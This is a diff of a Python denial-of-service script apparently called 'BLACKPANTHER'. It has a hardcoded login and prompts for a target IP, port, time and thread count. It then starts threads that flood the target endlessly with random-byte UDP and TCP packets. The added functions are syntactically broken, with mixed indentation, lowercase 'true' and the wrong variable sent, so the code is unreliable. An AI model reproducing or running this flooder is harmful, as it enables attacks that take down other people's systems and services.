@@ -47,42 +47,27 @@ print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
 print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
 print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
 while attemps < 100:
-    username = input('\033[33mEnter your username: \033[0m')
-    password = input('\033[94mEnter your password: \033[0m')
+    username = input("\033[95mEnter your username: \033[0m")
+    password = input("\033[94mEnter your password: \033[0m")
 
     if username == 'n0lk0ma' and password == 'n0lk0ma':
-        print('Hei...!! kamu berhasil login di BLACKPANTHER!!')
+        print("\033[33m★★★Hai...kamu berhasil login di BLACKPANTHER!!★★★\033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
         attemps += 1
         continue
+os.system("clear")
 
+(
 
-ip = str(input("\033[94mTarget IP :  \033[0m"))
-port = int(input("\033[97mTarget Port :  \033[0m"))
-choice = str(input("\033[31m (y/n) :  \033[0m"))
-times = int(input("\033[96mTime : \033[0m"))
-threads = int(input("\033[92mThreads :  \033[0m"))
-time.sleep(5),
-print("\033[96m               ⟩⟩  ANTI RACIST \033[0m "),
-time.sleep(5),
-print("\033[92m               ⟩⟩  ANTI TERRORIST \033[0m "),
-time.sleep(5),
-print("\033[1m               ⟩⟩  ANTI OPPRESSION \033[0m "),
-time.sleep(5),
-print("\033[97m               ⟩⟩  ANTI GENOCIDE \033[0m "),
-time.sleep(5),
-print("\033[95m               ⟩⟩  FUCK U MURDER \033[0m "),
-time.sleep(5),
-
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+ip = str(input("\033[96m Target IP : \033[0m"))
+port = int(input("\033[92m Target Port : \033[0m"))
+choice = str(input("\033[31m (y/n) : \033[0m"))
+times = int(input(" Time : "))
+threads = int(input("\033[36m Threads : \033[0m"))
 def run():
-	data = random._urandom(1490)
+	data = random._urandom(1024)
 	i = random.choice(("[+]"))
 	while True:
 		try:
@@ -94,12 +79,21 @@ def run():
 		except:
 			print("[!] Error!!!")
 
-while run:
+def run2():
+	data = random._urandom(20000)
+   i = random.choice(("[+]"))
+   while true:
+		try:
+       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s.sendto(bytes, (ip,port))
+    print(i +"Attack Sent!!!")
+		 except:
+			print("[!] Error!!!")
 
-    clock.tick(3)
+def run3():
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
-	while True:
+	while true:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
@@ -112,9 +106,7 @@ while run:
 			print("[*] Error!!!")
             
 
-while run:
-
-    clock.tick(4)
+def run4():
 	data = random._urandom(818)
 	i = random.choice(("[+]"))
 	while True:
@@ -130,9 +122,7 @@ while run:
 			print("[-] Error!!!")
             
   
-while run:
-
-    clock.tick(5)
+def run5():
 	data = random._urandom(16)
 	i = random.choice(("[+]"))
 	while True:
@@ -148,6 +138,8 @@ while run:
 			print("[-] Error!!!")
 
 
+											
+            
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
@@ -156,10 +148,8 @@ for y in range(threads):
 		th.start()
 		th = threading.Thread(target = run3)
 		th.start()
-		th = threading.Thread(target = run4)
-		th.start()
 else:
-		th = threading.Thread(target = run5)
+		th = threading.Thread(target = run4)
 		th.start()
 
 
